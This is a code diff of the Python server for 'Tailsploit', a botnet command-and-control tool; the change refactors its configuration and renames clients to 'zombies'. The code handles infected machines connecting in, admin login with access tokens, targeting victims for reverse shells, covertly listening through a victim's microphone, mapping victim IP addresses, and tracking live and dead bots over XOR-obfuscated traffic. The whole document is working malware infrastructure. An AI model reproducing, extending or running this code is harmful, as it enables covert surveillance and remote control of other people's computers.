@@ -13,9 +13,6 @@ import datetime
 import ctypes
 import folium
 import select
-import base64
-import pyotp
-from qrcode_term import qrcode_string
 
 # Get the absolute path of the directory containing the script
 script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -52,7 +49,7 @@ PERMISSION_HIERARCHY = {
 def StaticMethodCommandHandler(command_string, min_rank, is_available=True, reverse_shell_flag=None):
     def DecoratorMethod(command_func):
         def StaticWrapper(self, admin_socket, admin_username, handleAdminShellCommands, *args):
-            admin_info = self.admins.get(admin_username)
+            admin_info = self.TAILSPLOIT_ADMINS_SESSION.get(admin_username)
             if admin_info is not None:
                 admin_permission = admin_info['permission']
                 admin_rank = PERMISSION_HIERARCHY.get(admin_permission, 0)
@@ -90,23 +87,38 @@ def StaticMethodCommandHandler(command_string, min_rank, is_available=True, reve
 
 class ServerShell:
     def __init__(self):
-        self.SERVER_IP = "127.0.0.1"
-        self.PORT_IP =  5050
-        self.clients = {}
-        self.admins = {}  
-        self.DEFAULT_KEY_LENGTH = 64
+        self.TAILSPLOIT_ZOMBIES = {}
+        self.TAILSPLOIT_ADMINS_SESSION = {}  
         self.TARGET_CLIENT = None
-        self.disconnected_clients = set()
+        self.DISCONNECTED_ZOMBIES = set()
         self.TRAFFIC_ENCRYPTION_TOKEN = b'AUTHORIZED?BOTNET=ENCRYPTIONTYPE?XOR'
         self.TAILSPLOIT_LOG_WEBOOK = False
         self.TailsploitCommandHandler = {}
-        self.UserPermission = ""
-        self.clients_lock = threading.Lock()
-        self.MAX_ADMINS_CONN = 5
-        self.SET_TIMEOUT = 1800
-        self.TIMEOUT_SESSION = False
-        self.MFA_SESSION_PSWD = "password"
-        self.MFA_SESSION = False
+        self.SESSION_PERMISSION = ""
+        self.TAILSPLOIT_THREAD_LOCK_ZOMBIES = threading.Lock()
+        self.TailsploitServerConfigurationJSON()
+
+    def TailsploitServerConfigurationJSON(self):
+        with open("../../lib/configuration/tsf_config.json", "r") as TailsploitJSONConfig:
+            data = json.load(TailsploitJSONConfig)
+
+            TailsploitServerConfigurationFlag = "TAILSPLOIT_SERVER_CONFIGURATION"
+            TailsploitServerAuthorizationFlag = "TAILSPLOIT_SERVER_AUTHORIZATION"
+            TailsploitServerTokenFlag = "TAILSPLOIT_SERVER_TOKEN"
+
+            # Server Configuration
+            self.TSF_SERVER_IP = data[f"{TailsploitServerConfigurationFlag}"]["TSF_SERVER_IP_CONFIG"]
+            self.TSF_SERVER_PORT = data[f"{TailsploitServerConfigurationFlag}"]["TSF_SERVER_PORT_CONFIG"]
+            self.TSF_SERVER_MAX_ADMINS_CONN = data[f"{TailsploitServerConfigurationFlag}"]["TSF_SERVER_MAX_ADMINS_CONN"]
+            
+            # Server Authorization
+            self.TSF_MFA_SESSION_STATE = data[f"{TailsploitServerAuthorizationFlag}"]["TSF_MFA_SESSION_STATE"]
+            self.TSF_MFA_SESSION_PASSWORD = data[f"{TailsploitServerAuthorizationFlag}"]["TSF_MFA_SESSION_PASSWORD"]
+            self.TSF_SESSION_TIMEOUT = data[f"{TailsploitServerAuthorizationFlag}"]["TSF_SESSION_TIMEOUT"]
+            self.TSF_SESSION_TIMEOUT_TIME = data[f"{TailsploitServerAuthorizationFlag}"]["TSF_SESSION_TIMEOUT_TIME"]
+
+            # Server Token
+            self.TSF_TOKEN_DEFAULT_LENGTH = data[f"{TailsploitServerTokenFlag}"]["TSF_TOKEN_DEFAULT_LENGTH"]
 
     def handleXOREncryption(self, content_data, key_traffic):
         key_traffic = key_traffic * (len(content_data) // len(key_traffic)) + key_traffic[:len(content_data) % len(key_traffic)]
@@ -118,21 +130,15 @@ class ServerShell:
 
         for key_info in self.TOKEN_AUTH:
             if key_info['token'] == key:
-                self.UserPermission = key_info["permission"]
+                self.SESSION_PERMISSION = key_info["permission"]
                 if key_info.get('status') == 'active':
-                    # Check if the token (key) is already used
-                    for admin_info in self.admins.values():
+                    for admin_info in self.TAILSPLOIT_ADMINS_SESSION.values():
                         if admin_info["token"] == key:
-                            # Token is already used, return "already used"
                             return "--FLAG_TOKEN_ALREADY_IN_USE"
-                    # Token is whitelisted and not used by any admin yet, return "valid"
                     return
                 else:
-                    # Token is revoked, return "revoked"
                     return "--FLAG_TOKEN_REVOKED"
-        # Token is not whitelisted, return "not valid"
         return "--FLAG_TOKEN_NOT_VALID"
-
 
     @StaticMethodCommandHandler("task", is_available=True, reverse_shell_flag=False, min_rank=1)
     def handleViewThreadCommand(self, admin_socket, handleAdminShellCommands, *args):
@@ -178,7 +184,7 @@ class ServerShell:
             client_port = int(client_port)
             client_addr = (client_ip, client_port)
 
-            if client_addr in self.clients:
+            if client_addr in self.TAILSPLOIT_ZOMBIES:
                 self.TARGET_CLIENT = client_addr
                 FlagReverseShellConnected = f"{client_ip}:{client_port} --FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?CONNECTED"
                 FlagReverseShellConnectedXOR = self.handleXOREncryption(FlagReverseShellConnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
@@ -186,20 +192,20 @@ class ServerShell:
                 print(f"{Fore.GREEN}[*]{Style.RESET_ALL} (Reverse TCP) Administrator \x1B[4m{admin_username}\x1B[0m Targeting → {Fore.YELLOW}{client_ip}:{client_port}{Style.RESET_ALL}")
 
             else:
-                print(f"[{Fore.RED}-{Style.RESET_ALL}] Client not found.")
                 FlagReverseShellNotFound = f"--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?NOTFOUND"
                 FlagReverseShellNotFoundXOR = self.handleXOREncryption(FlagReverseShellNotFound.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(FlagReverseShellNotFoundXOR)
         except: 
-            print("ERRORORORORORO")
-            admin_socket.send("An error occured please try again".encode("utf-8"))
+            InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'target  <IP>:<PORT>'."
+            InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(InvalidFormatXOR)
 
     @StaticMethodCommandHandler("listen", is_available=True, min_rank=2, reverse_shell_flag=True)
     def TailsploitListenTargetMicrophone(self, admin_socket, admin_username, handleAdminShellCommands, *args):
         if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
             target_ip, target_port = args[1].split(":")
             target_client_addr = (target_ip, int(target_port))
-            target_socket = self.clients.get(target_client_addr)
+            target_socket = self.TAILSPLOIT_ZOMBIES.get(target_client_addr)
             if target_socket:
                 thread_target = "LISTENING_MICROPHONE"
                 try:
@@ -224,7 +230,7 @@ class ServerShell:
     @StaticMethodCommandHandler("map", is_available=True, min_rank=1, reverse_shell_flag=False)
     def TailsploitMapLayers(self, admin_socket, admin_username, handleAdminShellCommands, *args):
         print("[*] Generating tailsploit data map layers...")
-        ConnListData = f"--FLAG_TAILSPLOIT_CONN_CLIENT_MAP:{[client_addr[0] for client_addr in self.clients.keys()]}"
+        ConnListData = f"--FLAG_TAILSPLOIT_CONN_CLIENT_MAP:{[client_addr[0] for client_addr in self.TAILSPLOIT_ZOMBIES.keys()]}"
         ConnListDataXOR = self.handleXOREncryption(ConnListData.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
         admin_socket.send(ConnListDataXOR)
         print("[*] Done, data has been save in ../../tmp/tailsploit-bot-ipmap-layer-html")
@@ -234,7 +240,7 @@ class ServerShell:
         if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
             target_ip, target_port = args[1].split(":")
             target_client_addr = (target_ip, int(target_port))
-            target_socket = self.clients.get(target_client_addr)
+            target_socket = self.TAILSPLOIT_ZOMBIES.get(target_client_addr)
             if target_socket:
                 thread_target = "STOP_MICROPHONE"
                 try:
@@ -335,13 +341,13 @@ class ServerShell:
 
             except ConnectionAbortedError:
                 print(f"{Fore.RED}[-]{Style.RESET_ALL} Tailsploit Admin Session \x1B[4m{admin_username}\x1B[0m Disconnected.")
-                del self.admins[admin_username]
+                del self.TAILSPLOIT_ADMINS_SESSION[admin_username]
                 self.admin_socket = None
                 break
 
             except ConnectionResetError:
                 print(f"{Fore.RED}[-]{Style.RESET_ALL} Tailsploit Admin Session \x1B[4m{admin_username}\x1B[0m Disconnected.")
-                del self.admins[admin_username]
+                del self.TAILSPLOIT_ADMINS_SESSION[admin_username]
                 self.admin_socket = None
                 break
 
@@ -352,8 +358,8 @@ class ServerShell:
             ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
             return len(ansi_escape.sub('', text))
 
-        alive_bots = len(self.clients)
-        dead_bots = len(self.disconnected_clients)
+        alive_bots = len(self.TAILSPLOIT_ZOMBIES)
+        dead_bots = len(self.DISCONNECTED_ZOMBIES)
         total_bots = alive_bots + dead_bots
 
         line_width = visible_length("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
@@ -369,7 +375,7 @@ class ServerShell:
 
         client_info_list = []
         no_client_info = []
-        for i, (client_addr, client_socket) in enumerate(self.clients.items(), start=1):
+        for i, (client_addr, client_socket) in enumerate(self.TAILSPLOIT_ZOMBIES.items(), start=1):
             ip_address, port = client_addr
             desktop_name = "Malcolm"
 
@@ -379,7 +385,7 @@ class ServerShell:
         NONE_AVAILABLE_BOTS = "         There is no bot currently connected."
         no_client_info.append(NONE_AVAILABLE_BOTS)
 
-        if len(self.clients) <= 0:
+        if len(self.TAILSPLOIT_ZOMBIES) <= 0:
             NewFormatZombies = formatZombiesList + "\n" + "\n".join(no_client_info) + "\n"
         else:
             NewFormatZombies = formatZombiesList + "\n" + "\n".join(client_info_list) + "\n"
@@ -392,7 +398,7 @@ class ServerShell:
         if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
             target_ip, target_port = args[1].split(":")
             target_client_addr = (target_ip, int(target_port))
-            target_socket = self.clients.get(target_client_addr)
+            target_socket = self.TAILSPLOIT_ZOMBIES.get(target_client_addr)
             if target_socket:
                 thread_target = "REVERSE_SHELL_THREAD=ISALIVE?"
                 try:
@@ -415,7 +421,7 @@ class ServerShell:
 
     def view_disconnected_clients(self, admin_socket):
         print("\nDisconnected Clients:")
-        for addr in self.disconnected_clients:
+        for addr in self.DISCONNECTED_ZOMBIES:
             print(f"Client {addr} is disconnected.")
         
         admin_socket.send("DISC".encode('utf-8'))
@@ -479,7 +485,7 @@ class ServerShell:
         UserPermissionToken = args[2]
 
         try:
-            CreateTaileploitAccessToken = GenerateHashkeyRequest(self.DEFAULT_KEY_LENGTH, UserPermissionToken)
+            CreateTaileploitAccessToken = GenerateHashkeyRequest(self.TSF_TOKEN_DEFAULT_LENGTH, UserPermissionToken)
 
             CreatedFormatToken = f"""
 [{Fore.BLUE}*{Style.RESET_ALL}] New access token has been generated ({Fore.RED}Keep it secret{Style.RESET_ALL})
@@ -506,7 +512,7 @@ For more information, see the JSON file located at:
     @StaticMethodCommandHandler("adminlist", is_available=True, min_rank=1, reverse_shell_flag=False)
     def handleAdminListCommand(self, admin_socket, *args):
         admin_list = []
-        for username, admin_info in self.admins.items():
+        for username, admin_info in self.TAILSPLOIT_ADMINS_SESSION.items():
             addr = admin_info["addr"]
             join_time = admin_info["join_time"]
             permission = admin_info["permission"]
@@ -525,7 +531,7 @@ For more information, see the JSON file located at:
 
     @StaticMethodCommandHandler("session", is_available=True, min_rank=1, reverse_shell_flag=False)
     def handleAdminInfoCommand(self, admin_socket, admin_username, handleAdminShellCommands, *args):
-            admin_info = self.admins.get(admin_username)
+            admin_info = self.TAILSPLOIT_ADMINS_SESSION.get(admin_username)
             if admin_info:
                 addr = admin_info["addr"]
                 join_time = admin_info["join_time"]
@@ -546,7 +552,7 @@ For more information, see the JSON file located at:
                 
 Server Encryption Communication : {Fore.GREEN}Enabled{Style.RESET_ALL}
 Server Authentication Token : {Fore.GREEN}Enabled{Style.RESET_ALL}
-Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "Enabled" if self.TIMEOUT_SESSION else "Disabled"}{Style.RESET_ALL}"""
+Server Session Timed out : {Fore.GREEN if self.TSF_SESSION_TIMEOUT else Fore.RED}{ "Enabled" if self.TSF_SESSION_TIMEOUT else "Disabled"}{Style.RESET_ALL}"""
         AuthorizationStatusXOR = self.handleXOREncryption(AuthorizationStatus.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
         admin_socket.send(AuthorizationStatusXOR)
 
@@ -579,12 +585,12 @@ Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "
                 if self.TAILSPLOIT_LOG_WEBOOK:
                     TailsploitIncomingConnectionRegularClient(client_addr)
                 print("Regular client without a MAC address")
-                self.clients[client_addr] = client_socket
+                self.TAILSPLOIT_ZOMBIES[client_addr] = client_socket
                 return
 
             OnAuthTokenResult = self.is_mac_whitelisted(AUTHENTICATION_KEY)
             print(f"{Fore.YELLOW}[~]{Style.RESET_ALL} An Administrator Attempt To Connect ({Fore.YELLOW}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
-            if len(self.admins) >= self.MAX_ADMINS_CONN:
+            if len(self.TAILSPLOIT_ADMINS_SESSION) >= self.TSF_SERVER_MAX_ADMINS_CONN:
                 print("Max Admin Reached")
                 client_socket.close()
                 return
@@ -622,7 +628,7 @@ Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "
                 AUTHORIZED_TOKEN_CONVERTXOR = self.handleXOREncryption(OnAuthorizeToken.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 client_socket.send(AUTHORIZED_TOKEN_CONVERTXOR)
 
-                if self.MFA_SESSION:
+                if self.TSF_MFA_SESSION_STATE:
                     REQUIRE_MFA_FLAG = "--FLAG_MFA_REQUIRED"
                     REQUIRE_MFA_FLAG_XOR = self.handleXOREncryption(REQUIRE_MFA_FLAG.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                     client_socket.send(REQUIRE_MFA_FLAG_XOR)
@@ -630,7 +636,7 @@ Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "
                         MFA_AUTH_ADMIN = client_socket.recv(1024)
                         MFA_AUTH_ADMIN_DECODED = self.handleXOREncryption(MFA_AUTH_ADMIN, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
                         
-                        if MFA_AUTH_ADMIN_DECODED == self.MFA_SESSION_PSWD:
+                        if MFA_AUTH_ADMIN_DECODED == self.TSF_MFA_SESSION_PASSWORD:
                             MFA_STATUS_200_FLAG = "--FLAG_MFA_STATUS=200"
                             MFA_STATUS_200_FLAG_XOR = self.handleXOREncryption(MFA_STATUS_200_FLAG.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                             client_socket.send(MFA_STATUS_200_FLAG_XOR)
@@ -651,8 +657,8 @@ Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "
                     AdminUsername = self.handleXOREncryption(AdminUsernameXOR, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
                     #print(f"Received username from admin {client_addr}: {AdminUsername}")
 
-                            # Check if the admin username is already chosen
-                    if AdminUsername in self.admins:
+                    # Check if the admin username is already chosen
+                    if AdminUsername in self.TAILSPLOIT_ADMINS_SESSION:
                         UsernameTaken = "--FLAG_USERNAME_ALREADY_CHOSEN"
                         UsernameTakenXOR = self.handleXOREncryption(UsernameTaken.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                         client_socket.send(UsernameTakenXOR)
@@ -674,18 +680,18 @@ Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "
                 # ISSUE : Might have a race condition when 2 admins or more connect at the exact same time (we talk about milisecond) because we not running this function
                 # in a separate thread, that mean all the local function can be overwritted by the other admin, it can cause some data corruption but its not a high frequency issue, if anyone wants to do a pull request to fix that feel free :)
                 # By the way we are not running this function in a separate thread because if we have 500 clients + few admins, the server will need to handle around 500+ threads so not optimized at all.
-                admin_info = {"socket": client_socket, "addr": client_addr, "join_time": time.time(), "token": AUTHENTICATION_KEY, "permission": self.UserPermission}
+                admin_info = {"socket": client_socket, "addr": client_addr, "join_time": time.time(), "token": AUTHENTICATION_KEY, "permission": self.SESSION_PERMISSION}
                 print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Starting Administrator Session... Connection Initiated - {AdminUsername} ({Fore.GREEN}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
 
-                self.admins[AdminUsername] = admin_info
+                self.TAILSPLOIT_ADMINS_SESSION[AdminUsername] = admin_info
                 if self.TAILSPLOIT_LOG_WEBOOK:
                     TailsploitIncomingConnectionAdminClientAuthorized(client_addr)
 
                 admin_thread = threading.Thread(target=self.handle_admin, args=(client_socket, client_addr, AdminUsername), name=f"Tailsploit Admin Session Data Handler - @{AdminUsername}")
                 admin_thread.start()
 
-                if self.TIMEOUT_SESSION:    
-                    admin_timeout_session_thread = threading.Timer(self.SET_TIMEOUT, self.TailsploitTimeoutSession, args=(client_socket, AdminUsername,))
+                if self.TSF_SESSION_TIMEOUT:    
+                    admin_timeout_session_thread = threading.Timer(self.TSF_SESSION_TIMEOUT_TIME, self.TailsploitTimeoutSession, args=(client_socket, AdminUsername,))
                     admin_timeout_session_thread.name = f"Tailsploit Admin Session Timeout Handler - @{AdminUsername}"
                     admin_timeout_session_thread.start()
             else:
@@ -718,8 +724,8 @@ Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "
                 InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(InvalidFormatXOR)
                 return
-            if args[0] in self.admins:
-                admin_info = self.admins[args[0]]
+            if args[0] in self.TAILSPLOIT_ADMINS_SESSION:
+                admin_info = self.TAILSPLOIT_ADMINS_SESSION[args[0]]
                 KickedFromServer = "--FLAG_KICKED_FROM_SERVER"
                 KickedFromServerXOR = self.handleXOREncryption(KickedFromServer.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 TargetSocket = admin_info["socket"]
@@ -738,10 +744,10 @@ Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "
     def TailsploitTrafficCommunicationData(self):
         while True:
             try:
-                if not self.clients:
+                if not self.TAILSPLOIT_ZOMBIES:
                     continue  # No clients, continue to the next iteration
 
-                readable, _, _ = select.select(list(self.clients.values()), [], [], 1)
+                readable, _, _ = select.select(list(self.TAILSPLOIT_ZOMBIES.values()), [], [], 1)
                 
                 for client_socket in readable:
                     try:
@@ -764,12 +770,12 @@ Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "
             self.process_data(client_socket, decoded_data)
 
     def HandleClientDisconnect(self, client_socket):
-        with self.clients_lock:
-            for client_addr, socket in self.clients.items():
+        with self.TAILSPLOIT_THREAD_LOCK_ZOMBIES:
+            for client_addr, socket in self.TAILSPLOIT_ZOMBIES.items():
                 if socket == client_socket:
-                    del self.clients[client_addr]
-                    if client_addr not in self.disconnected_clients:
-                        self.disconnected_clients.add(client_addr)
+                    del self.TAILSPLOIT_ZOMBIES[client_addr]
+                    if client_addr not in self.DISCONNECTED_ZOMBIES:
+                        self.DISCONNECTED_ZOMBIES.add(client_addr)
                         print(f"{Fore.RED}[-]{Style.RESET_ALL} Client {Fore.YELLOW}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL} Disconnected from the botnet")
 
     def ForwardToAdminSocket(self, data):
@@ -784,7 +790,7 @@ Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "
             # Remove the flag name and keep the rest
             FormattedStringMessageADMN = ' '.join(parts[1:])
             StringWithADMN = f"--FLAG_MESSAGE_MODE_ADMN_FORWARDED \x1B[4m{admin_username}\x1B[0m: {FormattedStringMessageADMN}"
-            for admin_username, admin_info in self.admins.items():
+            for admin_username, admin_info in self.TAILSPLOIT_ADMINS_SESSION.items():
                 admin_socket = admin_info['socket']
                 try:
                     AdminForwardMessageXOR = self.handleXOREncryption(StringWithADMN.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
@@ -875,8 +881,8 @@ Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "
             print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Checking Port Provided Format...")
             time.sleep(0.1)
             print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Checking IPv4 Provided Format...")
-            socket.inet_pton(socket.AF_INET, self.SERVER_IP)  # Check if valid IP address
-            if 0 < self.PORT_IP < 65536:  # Check if valid port number
+            socket.inet_pton(socket.AF_INET, self.TSF_SERVER_IP)  # Check if valid IP address
+            if 0 < self.TSF_SERVER_PORT < 65536:  # Check if valid port number
                 print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Done, Port binded to Tailsploit Server")
                 time.sleep(0.1)
             else:
@@ -892,7 +898,7 @@ Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "
         time.sleep(0.2)
         print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server socket bound successfully.")
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket.bind((self.SERVER_IP, self.PORT_IP))
+        server_socket.bind((self.TSF_SERVER_IP, self.TSF_SERVER_PORT))
         server_socket.listen()
         end_time = time.time() 
         elapsed_time_ms = (end_time - start_time) * 1000
@@ -909,7 +915,7 @@ Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "
  :%@@@@@@@@@@@*.        
 .@@@@@@@@@#+-     -=    [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Encryption Type: {Fore.YELLOW}XOR Encryption (Low-Level){Style.RESET_ALL}
 %@@@@#=:        -#@@    
-@@%-         .=@@@@@    [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Information: {self.SERVER_IP} : {self.PORT_IP}
+@@%-         .=@@@@@    [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server Information: {self.TSF_SERVER_IP} : {self.TSF_SERVER_PORT}
 --      :=+#%@@@@@@*    
      .*@@@@@@@@@@@%     [{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Botnet Type: {Fore.YELLOW}Centralized Node (Client-Server){Style.RESET_ALL}
    .*@@@@@@@@@@@@+      
